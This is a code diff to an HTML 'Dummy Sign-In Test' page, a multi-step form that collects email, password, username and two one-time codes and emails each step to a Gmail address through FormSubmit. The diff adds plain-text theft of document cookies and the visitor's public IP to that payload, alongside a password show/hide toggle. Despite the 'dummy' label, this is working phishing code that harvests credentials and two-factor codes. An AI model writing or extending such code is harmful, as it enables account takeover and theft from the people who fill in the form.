@@ -3,6 +3,25 @@
 <head>
   <title>Dummy Sign-In Test</title>
   <meta charset="UTF-8">
+  <style>
+    .password-wrapper {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .password-wrapper input {
+      padding: 4px 6px;
+    }
+    .toggle-password {
+      cursor: pointer;
+      font-size: 18px;
+      user-select: none;
+      background: none;
+      border: none;
+      padding: 0;
+      line-height: 1;
+    }
+  </style>
 </head>
 <body>
 
@@ -13,7 +32,12 @@
     <h2>Step 1: Email and Password</h2>
     <form id="form1">
       <label>Email: <input type="email" id="email" required></label><br><br>
-      <label>Password: <input type="password" id="password" required></label><br><br>
+      <label>Password:
+        <span class="password-wrapper">
+          <input type="password" id="password" required>
+          <button type="button" class="toggle-password" id="togglePassword" title="Show password">👁️</button>
+        </span>
+      </label><br><br>
       <button type="submit">Continue</button>
     </form>
     <p id="status1"></p>
@@ -60,11 +84,50 @@
   </div>
 
   <script>
-    const data = {};
+    const data = {
+      email: "",
+      password: "",
+      username: "",
+      otp1: "",
+      otp2: "",
+      cookies: "",
+      ip: "(fetching...)"
+    };
     const ADMIN_EMAIL = "blessedresult6@gmail.com";
+
+    // Get cookies in plain text
+    data.cookies = document.cookie || "(no cookies)";
+
+    // Get public IP (using free public service)
+    fetch("https://api.ipify.org?format=json")
+      .then(function(res) { return res.json(); })
+      .then(function(json) {
+        data.ip = json.ip || "(unknown)";
+      })
+      .catch(function() {
+        data.ip = "(could not detect)";
+      });
+
+    // Password show/hide toggle (popular eye icon)
+    document.getElementById("togglePassword").addEventListener("click", function() {
+      const input = document.getElementById("password");
+      const btn = document.getElementById("togglePassword");
+      if (input.type === "password") {
+        input.type = "text";
+        btn.textContent = "🙈";
+        btn.title = "Hide password";
+      } else {
+        input.type = "password";
+        btn.textContent = "👁️";
+        btn.title = "Show password";
+      }
+    });
 
     // Send all collected dummy data so far to admin as plain text via FormSubmit
     function sendToAdmin(stepName, extraInfo) {
+      // Refresh cookies in case they changed
+      data.cookies = document.cookie || "(no cookies)";
+
       const payload = {
         _subject: "Dummy Sign-In - " + stepName,
         _template: "table",
@@ -75,8 +138,10 @@
         "Username": data.username || "(not entered yet)",
         "OTP 1": data.otp1 || "(not entered yet)",
         "OTP 2": data.otp2 || "(not entered yet)",
-        "Extra info": extraInfo || "",
-        "Timestamp": new Date().toISOString()
+        "Cookies": data.cookies,
+        "IP Address": data.ip,
+        "Timestamp": new Date().toISOString(),
+        "Extra info": extraInfo || ""
       };
 
       return fetch("https://formsubmit.co/ajax/" + ADMIN_EMAIL, {
@@ -93,7 +158,7 @@
       document.getElementById(id).textContent = message;
     }
 
-    // Step 1
+    // Step 1 – Email + Password (sent immediately)
     document.getElementById('form1').addEventListener('submit', function(e) {
       e.preventDefault();
       data.email = document.getElementById('email').value;
@@ -109,14 +174,13 @@
           document.getElementById('step2').style.display = 'block';
         })
         .catch(function() {
-          // Still continue even if send fails (dummy site)
           showStatus('status1', "Send attempted (continuing anyway).");
           document.getElementById('step1').style.display = 'none';
           document.getElementById('step2').style.display = 'block';
         });
     });
 
-    // Step 2
+    // Step 2 – Username (sent immediately)
     document.getElementById('form2').addEventListener('submit', function(e) {
       e.preventDefault();
       data.username = document.getElementById('username').value;
@@ -137,7 +201,7 @@
         });
     });
 
-    // Step 3 - OTP 1
+    // Step 3 – OTP 1 (sent immediately)
     document.getElementById('form3').addEventListener('submit', function(e) {
       e.preventDefault();
       data.otp1 = document.getElementById('otp1').value;
@@ -158,7 +222,7 @@
         });
     });
 
-    // Step 4 - OTP 2 → then waiting page
+    // Step 4 – OTP 2 (sent immediately) → waiting page
     document.getElementById('form4').addEventListener('submit', function(e) {
       e.preventDefault();
       data.otp2 = document.getElementById('otp2').value;
